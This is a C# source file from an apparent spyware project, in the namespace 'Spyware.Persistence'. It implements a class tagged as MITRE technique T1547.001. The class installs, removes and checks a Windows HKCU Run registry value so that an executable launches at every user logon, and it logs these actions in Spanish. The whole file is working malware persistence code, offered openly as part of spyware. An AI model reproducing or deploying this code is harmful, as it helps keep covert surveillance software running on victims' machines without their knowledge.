using Microsoft.Win32;
using Spyware.Core.Logging;

namespace Spyware.Persistence;

/// <summary>T1547.001 — Boot or Logon Autostart Execution: Run Keys / Startup Folder.</summary>
public sealed class RegistryRunInstaller
{
    public const string RunKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Run";

    public void Install(string valueName, string executablePath, ILog log)
    {
        if (string.IsNullOrWhiteSpace(valueName))
            throw new ArgumentException("registryValueName vacío.", nameof(valueName));

        using RegistryKey? key =
            Registry.CurrentUser.OpenSubKey(RunKeyPath, writable: true)
            ?? Registry.CurrentUser.CreateSubKey(RunKeyPath, RegistryKeyPermissionCheck.ReadWriteSubTree);

        if (key is null)
            throw new UnauthorizedAccessException("No se pudo abrir/crear la clave Run de HKCU.");

        string command = Quote(executablePath);
        key.SetValue(valueName, command, RegistryValueKind.String);
        log.Info($"Persistencia Run instalada: HKCU\\{RunKeyPath} :: {valueName} = {command}");
    }

    public void Remove(string valueName, ILog log)
    {
        using RegistryKey? key = Registry.CurrentUser.OpenSubKey(RunKeyPath, writable: true);
        if (key is null)
        {
            log.Warn("La clave Run de HKCU no existe: nada que eliminar.");
            return;
        }

        key.DeleteValue(valueName, throwOnMissingValue: false);
        log.Info($"Persistencia Run eliminada: {valueName}");
    }

    public string? GetValue(string valueName)
    {
        using RegistryKey? key = Registry.CurrentUser.OpenSubKey(RunKeyPath, writable: false);
        return key?.GetValue(valueName) as string;
    }

    public bool IsInstalled(string valueName, string executablePath)
    {
        string? current = GetValue(valueName);
        if (string.IsNullOrWhiteSpace(current)) return false;

        return string.Equals(
            current.Trim('"').Trim(),
            executablePath.Trim('"').Trim(),
            StringComparison.OrdinalIgnoreCase);
    }

    /// <summary>Siempre entre comillas: la ruta puede contener espacios.</summary>
    private static string Quote(string path) => "\"" + path.Trim().Trim('"') + "\"";
}
